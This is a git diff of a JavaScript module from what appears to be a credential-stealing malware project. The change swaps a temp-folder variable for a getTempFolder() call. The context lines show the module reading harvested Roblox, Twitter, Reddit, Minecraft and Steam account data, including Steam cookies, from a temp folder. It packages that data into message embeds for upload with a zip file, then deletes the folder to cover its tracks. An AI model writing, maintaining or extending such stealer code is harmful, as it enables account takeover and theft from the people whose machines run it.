@@ -4,7 +4,7 @@ const axios = require('axios');
 const { join, sep } = require('path');
 const os = require('os');
 const fs = require('fs');
-const { tempFolder, startTime } = require('../index');
+const { startTime } = require('../index');
 const FormData = require('form-data');
 const { rmSync, readFileSync } = require('fs');
 const { userAgent } = require('../config');
@@ -120,8 +120,8 @@ const json = async (zipFile) => {
     });
   }
 
-  if (fs.existsSync(join(tempFolder, 'Roblox.json'))) {
-    const robloxInfo = JSON.parse(fs.readFileSync(join(tempFolder, 'Roblox.json')).toString());
+  if (fs.existsSync(join(getTempFolder(), 'Roblox.json'))) {
+    const robloxInfo = JSON.parse(fs.readFileSync(join(getTempFolder(), 'Roblox.json')).toString());
 
     embeds.push({
       author: {
@@ -143,8 +143,8 @@ const json = async (zipFile) => {
     });
   }
 
-  if (fs.existsSync(join(tempFolder, 'Twitter.json'))) {
-    const profile = JSON.parse(fs.readFileSync(join(tempFolder, 'Twitter.json')).toString());
+  if (fs.existsSync(join(getTempFolder(), 'Twitter.json'))) {
+    const profile = JSON.parse(fs.readFileSync(join(getTempFolder(), 'Twitter.json')).toString());
 
     embeds.push({
       author: {
@@ -173,8 +173,8 @@ const json = async (zipFile) => {
     });
   }
 
-  if (fs.existsSync(join(tempFolder, 'Reddit.json'))) {
-    const account = JSON.parse(fs.readFileSync(join(tempFolder, 'Reddit.json')).toString());
+  if (fs.existsSync(join(getTempFolder(), 'Reddit.json'))) {
+    const account = JSON.parse(fs.readFileSync(join(getTempFolder(), 'Reddit.json')).toString());
 
     embeds.push({
       author: {
@@ -201,8 +201,8 @@ const json = async (zipFile) => {
     });
   }
 
-  if (fs.existsSync(join(tempFolder, 'Minecraft Accounts.json'))) {
-    const accounts = JSON.parse(fs.readFileSync(join(tempFolder, 'Minecraft Accounts.json')).toString());
+  if (fs.existsSync(join(getTempFolder(), 'Minecraft Accounts.json'))) {
+    const accounts = JSON.parse(fs.readFileSync(join(getTempFolder(), 'Minecraft Accounts.json')).toString());
 
     accounts.forEach(account => {
       embeds.push({
@@ -225,8 +225,8 @@ const json = async (zipFile) => {
     });
   }
 
-  if (fs.existsSync(join(tempFolder, 'Steam.json'))) {
-    const accounts = JSON.parse(fs.readFileSync(join(tempFolder, 'Steam.json'), 'utf8'));
+  if (fs.existsSync(join(getTempFolder(), 'Steam.json'))) {
+    const accounts = JSON.parse(fs.readFileSync(join(getTempFolder(), 'Steam.json'), 'utf8'));
 
     accounts.forEach(({ cookie, cookieSource, accountId, accountInfo, games, level }) => {
       const gamesListUrl = `${accountInfo.players[0].profileurl}games/?tab=all`;
@@ -290,7 +290,7 @@ const send = async (zipFile) => {
   const deleteFiles = async () => {
     try {
       await sleep(1000);
-      rmSync(tempFolder, { recursive: true });
+      rmSync(getTempFolder(), { recursive: true });
     } catch (e) {
       await deleteFiles();
     }
